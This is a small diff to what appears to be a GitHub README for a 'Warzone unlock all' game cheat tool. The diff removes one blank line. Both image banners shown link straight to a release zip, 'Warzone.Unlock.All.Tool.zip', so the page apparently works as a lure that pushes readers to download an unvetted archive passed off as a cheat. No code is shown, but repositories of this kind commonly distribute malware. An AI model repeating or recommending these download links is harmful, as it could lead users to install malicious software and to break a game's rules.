@@ -2,7 +2,6 @@
 
 [![image](https://github.com/user-attachments/assets/fcf4a864-f2c7-4ef7-897a-9c4226d654e6)](https://github.com/spree-serve-entity/warzone-unlock-all-tool/releases/download/latest/Warzone.Unlock.All.Tool.zip)
 
-
 [![image](https://github.com/user-attachments/assets/33ca32ba-6d5c-4f35-a66a-75792ae84403)](https://github.com/spree-serve-entity/warzone-unlock-all-tool/releases/download/latest/Warzone.Unlock.All.Tool.zip)
 
 # ⚙Functions⚙ ![hghhg](https://img.shields.io/badge/Settings-%23d81d7b)
